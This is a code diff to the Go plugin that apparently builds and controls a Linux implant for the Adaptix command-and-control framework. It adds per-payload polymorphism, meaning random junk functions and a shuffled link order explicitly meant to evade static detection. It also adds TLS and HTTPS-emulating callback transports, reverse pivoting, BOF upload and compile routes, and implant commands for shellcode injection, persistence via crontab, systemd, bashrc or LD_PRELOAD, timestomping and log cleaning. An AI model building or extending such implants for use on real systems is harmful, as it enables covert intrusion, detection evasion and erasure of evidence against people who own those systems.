@@ -14,6 +14,7 @@ import (
 	mrand "math/rand/v2"
 	"net/http"
 	"os"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"time"
@@ -93,6 +94,31 @@ type Teamserver interface {
 	TsEndpointRegisterPublicRaw(method string, path string, handler func(w http.ResponseWriter, r *http.Request)) error
 	TsEndpointUnregisterPublic(method string, path string) error
 	TsEndpointExistsPublic(method string, path string) bool
+
+	// Authenticated HTTP endpoints (batch 20: BOF list / upload / compile).
+	// ★ 为什么这三行不需要改核心：extender.Teamserver（core/extender/utils.go:86-88）
+	//   本就声明了同名同签名的三件套，而 core/server/server.go:58 `NewExtender(ts)`
+	//   传进去的就是 *server.Teamserver 本人 ⇒ *server.Teamserver 必然实现它们，
+	//   本地接口只是把它再声明一遍（见 core/server/ts_endpoints.go:10）。
+	//   与上面 Public 组的区别是承载组：connector.go:368 给 api_group 挂了
+	//   token.ValidateAccessToken()，username 由 token/jwt.go:101 写入。
+	//   ★ 反面：/bofs/upload 与 /bofs/compile 语义上就是「在 teamserver 上落文件
+	//   并调编译器」，做成 public 等于把 RCE 挂公网 ⇒ 必须走这一组。
+	TsEndpointRegister(method string, path string, handler func(username string, body []byte) (int, []byte)) error
+	TsEndpointUnregister(method string, path string) error
+	TsEndpointExists(method string, path string) bool
+}
+
+// axScriptDirsProvider —— **可选**能力：服务端本部署已加载 axscript 的所在目录。
+//
+// ★ 为什么不加进上面的必需 Teamserver 接口：
+//   上面那个断言失败就走 `return nil`，**整个 linux agent 直接消失**
+//   （extender.go:161 收到 nil 就 logs.Error 并跳过本插件）。为了让 BOF 候选能
+//   动态定位根目录，把一个「老服务端没有」的方法塞进必需接口，等于让新插件
+//   无法在旧服务端上运行 —— 赌上的是 agent 本身，换来的只是补全提示。
+//   单独断言 + 降级兜底（bofsExecRoots）才是对的代价结构。
+type axScriptDirsProvider interface {
+	TsAxScriptDirs() []string
 }
 
 type PluginAgent struct{}
@@ -103,17 +129,84 @@ var (
 	Ts             Teamserver
 	ModuleDir      string
 	AgentWatermark string
+
+	// AxScriptDirs：本部署已加载 axscript 的目录集（去重折叠后）。
+	// nil ⇒ 服务端不支持该能力（老版本），调用方必须准备兜底路径。
+	// 存成函数值而不是把 Ts 存下来再断言，是为了让单测能直接替身它。
+	AxScriptDirs func() []string
 )
 
 func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
+	// ★★ ModuleDir 必须在这里**一次性绝对化**，这是全插件路径正确性的唯一收口点。
+	//
+	//    moduleDir 源自 profile 的挂载串（"extenders/linux_agent/config.yaml"），
+	//    天生是**相对**路径；而它下挂的一切——stager 模板、matrix manifest、
+	//    BOF 的源/头/产物——都会被拼成路径后交给**按进程 cwd 解析**的系统调用
+	//    （os.Stat / os.ReadFile / exec 的 cmd.Dir）。
+	//    cwd 恰好是 teamserver 根目录时侥幸能中；换个 cwd（systemd 的
+	//    WorkingDirectory、`cd /tmp && ./adaptixserver`、任何包装脚本）就失效，
+	//    而且是**静默**失效——报错离真因十万八千里。
+	//
+	//    生产实证（批次20 运行态，非推演）：gcc 同时拿到**相对**源路径与**相对**
+	//    cmd.Dir，于是相对路径被二次解析，变成
+	//    "extenders/linux_agent/extenders/linux_agent/src_agent/bofs/x.c"
+	//    ⇒ `cc1: fatal error: No such file or directory`。
+	//    BOF 的 base 也同根：回给前端的相对路径会让 `execute bof` 的 os.Stat
+	//    随 cwd 漂移，失败后静默落进 base64 分支，agent 收到一串**路径文本**
+	//    当 BOF 字节。
+	//
+	//    为什么单元测试没抓到：所有用例都把 ModuleDir 设成 t.TempDir 系的
+	//    **绝对**临时目录 —— 「相对 ModuleDir」这个生产实况一次都没进过。
+	//    现由 TestBofsCompileUnderRelativeModuleDir 与
+	//    TestBofsBaseStaysAbsoluteUnderRelativeModuleDir 两条钉死。
+	//
+	//    在赋值点折进 cwd，语义与 os.Stat 完全同源，下游零改动。
+	if abs, err := filepath.Abs(moduleDir); err == nil {
+		moduleDir = abs
+	}
 	ModuleDir = moduleDir
 	AgentWatermark = watermark
-	Ts = ts.(Teamserver)
+	// ★ 原来是单值断言 `Ts = ts.(Teamserver)`：接口一旦漂移（核心改了方法签名，
+	//   或本文件的接口声明多写了一个核心没有的方法）就 **panic**。而这条 panic 路径
+	//   在插件加载里 —— core/extender/extender.go:160 直接调 pl_InitPlugin，
+	//   中间没有 recover ⇒ 一个插件的接口不匹配会掀翻**整台 teamserver** 的加载流程。
+	//   改成 comma-ok 后降级为「本插件不生效 + 明确日志」，且 extender.go:161
+	//   本来就检查 nil 返回值（`if pl_agent == nil { logs.Error(...); return }`），
+	//   所以返回 nil 是被调用方正确处理的一等路径，不是新引入的失败模式。
+	t, ok := ts.(Teamserver)
+	if !ok {
+		fmt.Printf("[linux_agent] FATAL: teamserver object does not satisfy the Teamserver interface; extender disabled\n")
+		return nil
+	}
+	Ts = t
+
+	// 可选能力：服务端能报出本部署的 axscript 目录 ⇒ BOF 候选根就不必再猜。
+	// 断言的是**收到的这个对象**（ts any，动态类型 *server.Teamserver），不是 Ts ——
+	// 后者静态类型是必需接口，看不到可选方法。
+	if p, ok := ts.(axScriptDirsProvider); ok {
+		AxScriptDirs = p.TsAxScriptDirs
+	} else {
+		fmt.Printf("[linux_agent] WARNING: teamserver has no TsAxScriptDirs; BOF roots fall back to relative guesses (deployments outside the default layout may list nothing)\n")
+	}
+
+	_ = gMatrix.Load(moduleDir) // Phase 3: matrix manifest (non-fatal when absent)
 	if err := linuxStagerInitRoutes(); err != nil {
 		fmt.Printf("[linux_agent] stager route init failed: %v\n", err)
 	} else {
 		fmt.Printf("[linux_agent] stager payload route ready: GET /s/:token\n")
 	}
+	// batch 20: authenticated BOF routes (list / upload / compile / exec)
+	//
+	// ★ 横幅由 bofsInitRoutes 自己打印 —— 它手里才有 routes 表。原来这里手抄
+	//   一份清单，加了 /bofs/exec 之后横幅照旧只列三条：**日志在说谎**，而
+	//   「日志说注册了」正是排查时最先信的那条证据。清单只能有一个出处。
+	if err := bofsInitRoutes(); err != nil {
+		fmt.Printf("[linux_agent] bofs routes init failed: %v\n", err)
+	}
+	// .o 不在构建产物里（运行期 gcc 现编）⇒ 全新部署一个都没有，而前端的
+	// `execute bof ` 补全只认 obj !== false 的条目 ⇒ 候选静默为空、还不报错。
+	// 这里补齐缺失/过期的产物，让部署开箱即用（健康部署下零开销）。
+	bofsAutoCompile()
 	return &PluginAgent{}
 }
 
@@ -133,12 +226,26 @@ func getStringArg(args map[string]any, key string) (string, error) {
 	return v, nil
 }
 
+// getFloatArg 读一个数值参数。
+//
+// ★ 必须收 int：axscript 的 addArgInt 在 core/axscript/parser.go:152 走
+// strconv.Atoi，落到 CreateCommand 的 args 里是 Go int，不是 float64。
+// 原来这里只做 .(float64) 断言 ⇒ 对 addArgInt 参数必然失败 ⇒ 调用方
+// goto RET ⇒ 发出 code=0 的任务 ⇒ agent 回 "Unknown command"。
+// 受影响：inject / kill / ps kill / link / listen，见各调用点。
+//
+// 缺参或非数值仍然报错 —— 放宽的是类型，不是错误语义。
+// （续行不留前导空格：gofmt 会把缩进的续行当代码块重排。）
 func getFloatArg(args map[string]any, key string) (float64, error) {
-	v, ok := args[key].(float64)
-	if !ok {
-		return 0, fmt.Errorf("parameter '%s' must be set", key)
+	switch v := args[key].(type) {
+	case float64:
+		return v, nil
+	case int:
+		return float64(v), nil
+	case int64:
+		return float64(v), nil
 	}
-	return v, nil
+	return 0, fmt.Errorf("parameter '%s' must be set", key)
 }
 
 func getBoolArg(args map[string]any, key string) bool {
@@ -260,6 +367,17 @@ type GenerateConfig struct {
 	ReconnectTimeout string `json:"reconn_timeout"`
 	ReconnectCount   int    `json:"reconn_count"`
 	OpsecEnabled     bool   `json:"opsec_enabled"`
+
+	// --- Stager 下载端点的来源（仅 Stager 格式用到）---
+	//
+	// 与 beacon_agent/pl_main.go 的 GenerateConfig 同义、同 JSON 键名：产品化 Stager
+	// 从**团队服务器自己的 HTTP endpoint** 的 /s/:token 取载荷，生成时必须知道那个
+	// endpoint 在哪。**主路径是控制台表单**（所有操作员都在 WebUI 上操作），进程环境
+	// 变量只作回退；两者都缺时硬报错，绝不静默回落 8080（那是 agent 监听器）。
+	StagerTSHost string `json:"stager_ts_host"`
+	StagerTSPort int    `json:"stager_ts_port"`
+	// 指针：区分「没填」与「明确填 false（明文端点）」。nil ⇒ 交由回退决定。
+	StagerTSSSL *bool `json:"stager_ts_ssl"`
 }
 
 var SrcPath = "src_macos" // Go fallback (unused for native C builds)
@@ -376,18 +494,44 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 		case "bind_tcp":
 			port, _ := listenerMap["port_bind"].(float64)
 
+			// Reverse pivot (opt-in): when the operator lists parent callback
+			// addresses, the generated agent dials the parent instead of
+			// listening -- no inbound reachability needed, no listening port.
+			// When the key is absent or empty, bindAddrs stays an empty (non-nil)
+			// slice so the marshalled profile is identical to the original.
+			var bindAddrs []string
+			switch raw := listenerMap["callback_addresses"].(type) {
+			case []interface{}:
+				for _, a := range raw {
+					if s, ok := a.(string); ok {
+						if s = strings.TrimSpace(s); s != "" {
+							bindAddrs = append(bindAddrs, s)
+						}
+					}
+				}
+			case string:
+				for _, a := range strings.Split(strings.ReplaceAll(raw, "\n", ","), ",") {
+					if a = strings.TrimSpace(a); a != "" {
+						bindAddrs = append(bindAddrs, a)
+					}
+				}
+			}
+			if bindAddrs == nil {
+				bindAddrs = []string{}
+			}
+
 			profile := Profile{
 				Type:              uint(agentWatermark),
 				ListenerWatermark: uint(listenerWatermark),
-				Addresses:         []string{},
+				Addresses:         bindAddrs,
 				BannerSize:        0,
 				ConnTimeout:       0,
 				ConnCount:         0,
 				BindPort:          int(port),
 			}
 			profileData, _ = msgpack.Marshal(profile)
-
-		case "ws":
+		case "ws", "https":
+			isHttpsEmu := protocol == "https"
 			// callback_addresses can be string or []interface{} — handle both
 			var addresses []string
 			switch addrs := listenerMap["callback_addresses"].(type) {
@@ -422,6 +566,11 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 				}
 			}
 
+			hbHeader, _ := listenerMap["hb_header"].(string)
+			if hbHeader == "" {
+				hbHeader = "X-Requested-With"
+			}
+
 			profile := Profile{
 				Type:              uint(agentWatermark),
 				ListenerWatermark: uint(listenerWatermark),
@@ -429,12 +578,14 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 				BannerSize:        0,
 				ConnTimeout:       reconnectTimeout,
 				ConnCount:         generateConfig.ReconnectCount,
-				UseSSL:            false, // WS SSL is handled at the HTTP layer, not at agent TCP level
+				UseSSL:            sslFromListenerMap(listenerMap), // H1: WSS when the WS listener serves TLS
 				Uris:              uriList,
 				UaList:            uaList,
 				UaCount:           len(uaList),
 				AnsSize:           0, // Will be computed from WebPageOutput template length
 				AnsPreSize:        0,
+				IsHttpsEmu:        isHttpsEmu,
+				HeartbeatHeader:   hbHeader,
 			}
 
 			// Compute ans_pre_size from WebPageOutput template
@@ -471,7 +622,11 @@ func (p *PluginAgent) GenerateProfiles(profile adaptix.BuildProfile) ([][]byte, 
 
 var (
 	NativeSrcDir   = "src_agent/agent"
-	NativeObjFiles = []string{"crt", "msgpack", "crypt", "connector", "agent_info", "commander", "tasks_fs", "tasks_proc", "tasks_linux", "tasks_opsec", "jobs", "tasks_async", "tasks_net", "proxyfire", "elf_resolve", "opsec", "pivot", "tasks_pivot", "ax_vsnprintf", "bof_api", "elf_bof", "ws_connector"}
+	NativeObjFiles = []string{"crt", "msgpack", "crypt", "connector", "agent_info", "commander", "tasks_fs", "tasks_proc", "tasks_linux", "tasks_opsec", "jobs", "tasks_async", "tasks_net", "proxyfire", "elf_resolve", "opsec", "pivot", "tasks_pivot", "ax_vsnprintf", "bof_api", "elf_bof", "ws_connector", "https_emu", "timing", "noise"}
+
+	// Embedded mbedtls (H1 WSS transport) — trimmed TLS1.3 client build
+	NativeMbedtlsSrcDir = "src_agent/mbedtls/library"
+	NativeMbedtlsObjs   = []string{"aes", "aesni", "asn1parse", "asn1write", "bignum", "bignum_core", "bignum_mod", "bignum_mod_raw", "chacha20", "chachapoly", "ccm", "cipher", "cipher_wrap", "constant_time", "ecdh", "ecdsa", "ecp", "ecp_curves", "entropy", "error", "gcm", "hmac_drbg", "md", "oid", "pk", "pk_ecc", "pk_wrap", "pkparse", "platform", "platform_util", "poly1305", "psa_crypto", "psa_crypto_aead", "psa_crypto_cipher", "psa_crypto_client", "psa_crypto_driver_wrappers_no_static", "psa_crypto_ecp", "psa_crypto_hash", "psa_crypto_mac", "psa_crypto_rsa", "psa_crypto_se", "psa_crypto_slot_management", "psa_util", "sha256", "sha512", "ssl_ciphersuites", "ssl_client", "ssl_msg", "ssl_tls", "ssl_tls13_client", "ssl_tls13_generic", "ssl_tls13_keys", "x509", "x509_crt"}
 )
 
 // Compiler selection based on architecture
@@ -483,18 +638,100 @@ func nativeCompiler(arch string) string {
 }
 
 func nativeCFlags(arch string) string {
-	base := "-std=gnu11 -Os -fno-stack-protector -fno-builtin -fno-unwind-tables -fno-asynchronous-unwind-tables -fno-ident -Wall -Wextra -Wno-unused-parameter -Wno-unused-function"
+	base := "-std=gnu11 -Os -U_FORTIFY_SOURCE -fno-stack-protector -fno-builtin -fno-unwind-tables -fno-asynchronous-unwind-tables -fno-ident -Wall -Wextra -Wno-unused-parameter -Wno-unused-function -Wno-cast-function-type -I src_agent/mbedtls/include -I src_agent/mbedtls -DMBEDTLS_CONFIG_FILE='<mbedtls_config_agent.h>'"
 	if arch == "aarch64" || arch == "arm64" {
 		return base + " -DARCH_AARCH64"
 	}
 	return base + " -DARCH_X86_64"
 }
 
-func nativeLFlags(arch string) string {
-	if arch == "aarch64" || arch == "arm64" {
-		return "-static -nostdlib -nodefaultlibs -s -Wl,--build-id=none"
+// sslFromListenerMap — "ssl" key of the WS listener config JSON (H1 WSS flag)
+func sslFromListenerMap(m map[string]interface{}) bool {
+	if v, ok := m["ssl"].(bool); ok {
+		return v
 	}
+	return false
+}
+
+// compileMbedtlsObjects — compile the embedded mbedtls objects + zero-libc glue
+// into tempDir. Reused by the ELF/SO/shellcode builders.
+func compileMbedtlsObjects(profile adaptix.BuildProfile, currentDir, tempDir, compiler, cFlags string, compileSrc func(string, string) error) error {
+	for _, ofile := range NativeMbedtlsObjs {
+		if err := compileSrc(NativeMbedtlsSrcDir+"/"+ofile+".c", ofile); err != nil {
+			return fmt.Errorf("compile mbedtls %s: %w", ofile, err)
+		}
+	}
+	if err := compileSrc("src_agent/mbedtls/mbedtls_glue.c", "mbedtls_glue"); err != nil {
+		return fmt.Errorf("compile mbedtls glue: %w", err)
+	}
+	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Embedded mbedtls (TLS1.3) compiled")
+	return nil
+}
+
+func nativeLFlags(arch string) string {
 	return "-static -nostdlib -nodefaultlibs -s -Wl,--build-id=none"
+}
+
+// ---- Per-payload polymorphism ----
+
+// shuffleObjects returns a copy of s in random order (Fisher-Yates with
+// crypto randomness). Randomizing link order yields a distinct .text /
+// .rodata layout per payload, defeating skeleton-level static similarity.
+func shuffleObjects(s []string) []string {
+	out := append([]string(nil), s...)
+	for i := len(out) - 1; i > 0; i-- {
+		j := int(cryptoRandUint32() % uint32(i+1))
+		out[i], out[j] = out[j], out[i]
+	}
+	return out
+}
+
+// generateJunkC builds a per-payload junk.c: random-named functions doing
+// harmless arithmetic (kept in .text because the link does not use
+// --gc-sections) plus a random-named, random-sized .rodata blob. Every
+// payload carries unique code/data entropy for static classifiers.
+func generateJunkC() string {
+	var sb strings.Builder
+	sb.WriteString("/* per-payload junk (polymorphism) */\n")
+	nfuncs := 2 + int(cryptoRandUint32()%4)
+	for i := 0; i < nfuncs; i++ {
+		name := fmt.Sprintf("fn_%08x", cryptoRandUint32())
+		fmt.Fprintf(&sb, "static volatile unsigned long %s(unsigned long x) {\n", name)
+		fmt.Fprintf(&sb, "    unsigned long y = x ^ 0x%08xUL;\n", cryptoRandUint32())
+		fmt.Fprintf(&sb, "    y = (y * 0x%08xUL) + 0x%08xUL;\n", cryptoRandUint32()|1, cryptoRandUint32())
+		sb.WriteString("    y ^= y >> 13;\n")
+		fmt.Fprintf(&sb, "    return y + 0x%08xUL;\n", cryptoRandUint32())
+		sb.WriteString("}\n")
+	}
+	blobName := fmt.Sprintf("blob_%08x", cryptoRandUint32())
+	blobSize := 128 + int(cryptoRandUint32()%640)
+	fmt.Fprintf(&sb, "static const unsigned char %s[%d] = {\n", blobName, blobSize)
+	for i := 0; i < blobSize; i += 12 {
+		b := make([]byte, 12)
+		_, _ = rand.Read(b)
+		parts := make([]string, 12)
+		for k := 0; k < 12; k++ {
+			parts[k] = fmt.Sprintf("0x%02x", b[k])
+		}
+		fmt.Fprintf(&sb, "    %s,\n", strings.Join(parts, ","))
+	}
+	sb.WriteString("};\n")
+	return sb.String()
+}
+
+// writeJunkAndCompile writes the per-payload junk.c into tempDir and
+// compiles it with the same flags as the agent sources. Returns the
+// object path to append to the link step.
+func (p *PluginAgent) writeJunkAndCompile(profile adaptix.BuildProfile, tempDir string, compiler string, cFlags string) (string, error) {
+	if err := os.WriteFile(tempDir+"/junk.c", []byte(generateJunkC()), 0644); err != nil {
+		return "", err
+	}
+	junkObj := tempDir + "/junk.o"
+	cmdStr := fmt.Sprintf("%s %s -c %s -o %s", compiler, cFlags, tempDir+"/junk.c", junkObj)
+	if err := Ts.TsAgentBuildExecute(profile.BuilderId, tempDir, "sh", "-c", cmdStr); err != nil {
+		return "", fmt.Errorf("compile junk.c: %w", err)
+	}
+	return junkObj, nil
 }
 
 func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
@@ -511,8 +748,8 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		return nil, "", err
 	}
 
-	arch := generateConfig.Arch
-	if arch == "" {
+	arch := strings.ToLower(generateConfig.Arch)
+	if arch == "" || arch == "x64" {
 		arch = "x86_64"
 	}
 
@@ -549,7 +786,7 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		}
 		defer os.RemoveAll(stagerTemp)
 		defer os.RemoveAll(tempDir)
-		return buildLinuxStager(profile.BuilderId, currentDir, stagerTemp, sc, listenerMap, arch)
+		return buildLinuxStager(profile.BuilderId, currentDir, stagerTemp, sc, listenerMap, arch, generateConfig)
 	default:
 		_ = os.RemoveAll(tempDir)
 		return nil, "", fmt.Errorf("unknown format: %s", generateConfig.Format)
@@ -611,6 +848,10 @@ func (p *PluginAgent) buildNativeELF(profile adaptix.BuildProfile, agentProfiles
 		_ = os.RemoveAll(tempDir)
 		return nil, "", fmt.Errorf("compile main: %w", err)
 	}
+	if err := compileMbedtlsObjects(profile, currentDir, tempDir, compiler, cFlags, compileSrc); err != nil {
+		_ = os.RemoveAll(tempDir)
+		return nil, "", err
+	}
 	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, "All sources compiled successfully")
 
 	// Step 3: Link
@@ -619,9 +860,24 @@ func (p *PluginAgent) buildNativeELF(profile adaptix.BuildProfile, agentProfiles
 		objectFiles = append(objectFiles, tempDir+"/"+ofile+".o")
 	}
 	objectFiles = append(objectFiles, tempDir+"/main.o")
+	for _, ofile := range NativeMbedtlsObjs {
+		objectFiles = append(objectFiles, tempDir+"/"+ofile+".o")
+	}
+	objectFiles = append(objectFiles, tempDir+"/mbedtls_glue.o")
+
+	// Per-payload polymorphism: unique junk.o + randomized link order
+	junkObj, junkErr := p.writeJunkAndCompile(profile, tempDir, compiler, cFlags)
+	if junkErr != nil {
+		_ = os.RemoveAll(tempDir)
+		return nil, "", junkErr
+	}
+	objectFiles = append(objectFiles, junkObj)
+	objectFiles = shuffleObjects(objectFiles)
 
 	lFlags := nativeLFlags(arch)
-	linkCmd := fmt.Sprintf("%s %s -o %s %s", compiler, lFlags, buildPath, strings.Join(objectFiles, " "))
+	// -lgcc AFTER objects: bignum's 128-bit division (__udivti3) resolves from
+	// libgcc; static libs must follow the objects that reference them.
+	linkCmd := fmt.Sprintf("%s %s -o %s %s -lgcc", compiler, lFlags, buildPath, strings.Join(objectFiles, " "))
 	if err := Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", linkCmd); err != nil {
 		_ = os.RemoveAll(tempDir)
 		return nil, "", fmt.Errorf("link: %w", err)
@@ -692,6 +948,10 @@ func (p *PluginAgent) buildNativeSO(profile adaptix.BuildProfile, agentProfiles 
 		_ = os.RemoveAll(tempDir)
 		return nil, "", fmt.Errorf("compile main: %w", err)
 	}
+	if err := compileMbedtlsObjects(profile, currentDir, tempDir, compiler, cFlags, compileSrc); err != nil {
+		_ = os.RemoveAll(tempDir)
+		return nil, "", err
+	}
 	_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_SUCCESS, "All sources compiled (SO mode)")
 
 	// Link as shared object
@@ -700,8 +960,21 @@ func (p *PluginAgent) buildNativeSO(profile adaptix.BuildProfile, agentProfiles 
 		objectFiles = append(objectFiles, tempDir+"/"+ofile+".o")
 	}
 	objectFiles = append(objectFiles, tempDir+"/main.o")
+	for _, ofile := range NativeMbedtlsObjs {
+		objectFiles = append(objectFiles, tempDir+"/"+ofile+".o")
+	}
+	objectFiles = append(objectFiles, tempDir+"/mbedtls_glue.o")
 
-	linkCmd := fmt.Sprintf("%s -shared -nostdlib -nodefaultlibs -s -Wl,--build-id=none -o %s %s", compiler, buildPath, strings.Join(objectFiles, " "))
+	// Per-payload polymorphism: unique junk.o + randomized link order
+	junkObj, junkErr := p.writeJunkAndCompile(profile, tempDir, compiler, cFlags)
+	if junkErr != nil {
+		_ = os.RemoveAll(tempDir)
+		return nil, "", junkErr
+	}
+	objectFiles = append(objectFiles, junkObj)
+	objectFiles = shuffleObjects(objectFiles)
+
+	linkCmd := fmt.Sprintf("%s -shared -nostdlib -nodefaultlibs -s -Wl,--build-id=none -o %s %s -lgcc", compiler, buildPath, strings.Join(objectFiles, " "))
 	if err := Ts.TsAgentBuildExecute(profile.BuilderId, currentDir, "sh", "-c", linkCmd); err != nil {
 		_ = os.RemoveAll(tempDir)
 		return nil, "", fmt.Errorf("link SO: %w", err)
@@ -855,7 +1128,15 @@ func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.Exten
 		return agentData, nil, errors.New("linux agent received non-linux OS")
 	}
 
+	// Session key: 16-byte AES key for LinuxTCP; for GopherTCP the agent
+	// appends a 16-byte transport_salt (32 bytes total, AES-GCM + ChaCha20
+	// overlay). The salt field must NOT be dropped — otherwise the server
+	// falls back to the 16-byte plain-GCM path and every session message
+	// fails to decrypt on both ends.
 	agentData.SessionKey = sessionInfo.EncryptKey
+	if len(sessionInfo.TransportSalt) == 16 {
+		agentData.SessionKey = append(append([]byte(nil), sessionInfo.EncryptKey...), sessionInfo.TransportSalt...)
+	}
 	agentData.Domain = ""
 	agentData.Computer = sessionInfo.Host
 	agentData.Username = sessionInfo.User
@@ -871,7 +1152,9 @@ func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.Exten
 
 func (ext *ExtenderAgent) Encrypt(data []byte, key []byte) ([]byte, error) {
 	if len(key) >= 32 {
-		return GopherSessionEncrypt(data, key)
+		// Overlay-only: the agent decrypts server responses with
+		// gopher_decrypt_nogcm (ChaCha20 overlay, no AES-GCM layer).
+		return GopherSessionEncryptNogcm(data, key)
 	}
 	block, err := aes.NewCipher(key)
 	if err != nil {
@@ -895,7 +1178,8 @@ func (ext *ExtenderAgent) Encrypt(data []byte, key []byte) ([]byte, error) {
 
 func (ext *ExtenderAgent) Decrypt(data []byte, key []byte) ([]byte, error) {
 	if len(key) >= 32 {
-		return GopherSessionDecrypt(data, key)
+		// Overlay-only: the agent sends gopher_encrypt_nogcm output.
+		return GopherSessionDecryptNogcm(data, key)
 	}
 	block, err := aes.NewCipher(key)
 	if err != nil {
@@ -949,6 +1233,11 @@ func (ext *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix
 
 	packData, _ = msgpack.Marshal(message)
 
+	// NOTE: do NOT encrypt here — the core's Agent.PackData calls
+	// ext.Encrypt(packed, SessionKey) AFTER PackTasks returns, so the
+	// session-layer encryption belongs in Encrypt() only. (Double
+	// encryption here broke the whole task channel — see Encrypt below.)
+
 	return packData, nil
 }
 
@@ -985,7 +1274,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 
 	command, ok := args["command"].(string)
 	if !ok {
-		return taskData, messageData, errors.New("'command' must be set")
+		return taskData, messageData, errors.New("'command' 参数未设置")
 	}
 	subcommand, _ := args["subcommand"].(string)
 
@@ -1050,17 +1339,28 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 	case "exit":
 		cmd = Command{Code: COMMAND_EXIT, Data: nil}
 
-	case "getuid":
+	case "getuid", "whoami":
+		// "whoami" 是 Web UI 的 Windows 习惯名；linux 等价物是 getuid
 		cmd = Command{Code: COMMAND_GETUID, Data: nil}
 
 	case "env":
 		cmd = Command{Code: COMMAND_ENV, Data: nil}
 
-	case "netstat":
+	case "netstat", "ipconfig":
+		// "ipconfig" is the Web UI's Windows-style name; map it to the
+		// linux network enumeration command.
 		cmd = Command{Code: COMMAND_NETSTAT, Data: nil}
 
-	case "mounts":
+	case "mounts", "disks":
+		// "disks" is the file-manager alias: mount enumeration doubles as
+		// the drive list (parsed into BROWSER_DISKS in ProcessData).
 		cmd = Command{Code: COMMAND_MOUNTS, Data: nil}
+
+	case "vnc":
+		// The linux agent has no agent-side VNC server; answer locally so
+		// the UI shows a clean console message instead of an error.
+		taskData.Type = adaptix.TASK_TYPE_LOCAL
+		taskData.Message = "VNC 不支持 linux agent"
 
 	case "edr":
 		cmd = Command{Code: COMMAND_EDR, Data: nil}
@@ -1092,7 +1392,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 		case "status":
 			// no extra args
 		default:
-			err = errors.New("subcommand must be: crontab, systemd, bashrc, ldpreload, remove, status")
+			err = errors.New("subcommand 必须为：crontab、systemd、bashrc、ldpreload、remove、status")
 			goto RET
 		}
 		packerData, _ := msgpack.Marshal(params)
@@ -1120,14 +1420,19 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 			goto RET
 		}
 		timestamp := uint64(0)
-		if ts, ok := args["timestamp"].(float64); ok {
+		// ★ 同 getFloatArg 头注：addArgInt 的值是 int，原来的 .(float64)
+		// 断言拿不到 ⇒ 时间戳**静默变 0**（不报错、结果错）。
+		if ts, errTs := getFloatArg(args, "timestamp"); errTs == nil {
 			timestamp = uint64(ts)
 		}
 		packerData, _ := msgpack.Marshal(ParamsTimestomp{Path: path, Timestamp: timestamp})
 		cmd = Command{Code: COMMAND_TIMESTOMP, Data: packerData}
 
 	case "cleanlog":
-		cmd = Command{Code: COMMAND_CLEANLOG, Data: nil}
+		clPath, _ := getStringArg(args, "path")
+		clPairs, _ := getStringArg(args, "pairs")
+		packerData, _ := msgpack.Marshal(ParamsCleanlog{Path: clPath, Pairs: clPairs})
+		cmd = Command{Code: COMMAND_CLEANLOG, Data: packerData}
 
 	case "inject":
 		pidF, err := getFloatArg(args, "pid")
@@ -1145,7 +1450,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 			var err3 error
 			scData, err3 = base64.StdEncoding.DecodeString(scStr)
 			if err3 != nil {
-				err = fmt.Errorf("invalid base64 shellcode: %v", err3)
+				err = fmt.Errorf("shellcode 的 base64 编码无效：%v", err3)
 				goto RET
 			}
 		}
@@ -1168,7 +1473,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 			cmd = Command{Code: COMMAND_JOB_KILL, Data: packerData}
 
 		} else {
-			err = errors.New("subcommand must be 'list' or 'kill'")
+			err = errors.New("subcommand 必须为 'list' 或 'kill'")
 			goto RET
 		}
 
@@ -1209,7 +1514,17 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 		cmd = Command{Code: COMMAND_MKDIR, Data: packerData}
 
 	case "ps":
-		cmd = Command{Code: COMMAND_PS, Data: nil}
+		// 进程管理器发送 ps kill <pid>；转换为真正的 kill 任务
+		if subcommand == "kill" {
+			pid, err := getFloatArg(args, "pid")
+			if err != nil {
+				goto RET
+			}
+			packerData, _ := msgpack.Marshal(ParamsKill{Pid: int(pid)})
+			cmd = Command{Code: COMMAND_KILL, Data: packerData}
+		} else {
+			cmd = Command{Code: COMMAND_PS, Data: nil}
+		}
 
 	case "pwd":
 		cmd = Command{Code: COMMAND_PWD, Data: nil}
@@ -1223,7 +1538,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 		cmd = Command{Code: COMMAND_RM, Data: packerData}
 
 	case "run":
-		taskData.Type = adaptix.TASK_TYPE_JOB
+		taskData.Type = adaptix.TASK_TYPE_TASK
 
 		prog, err := getStringArg(args, "program")
 		if err != nil {
@@ -1260,13 +1575,18 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 	case "socks":
 		taskData.Type = adaptix.TASK_TYPE_TUNNEL
 
-		portNumber, ok := args["port"].(float64)
-		port := int(portNumber)
-		if ok {
-			if port < 1 || port > 65535 {
-				err = errors.New("port must be from 1 to 65535")
-				goto RET
-			}
+		// ★ 同 getFloatArg 头注：addArgInt 的值是 int，原来的 .(float64) 断言拿不到
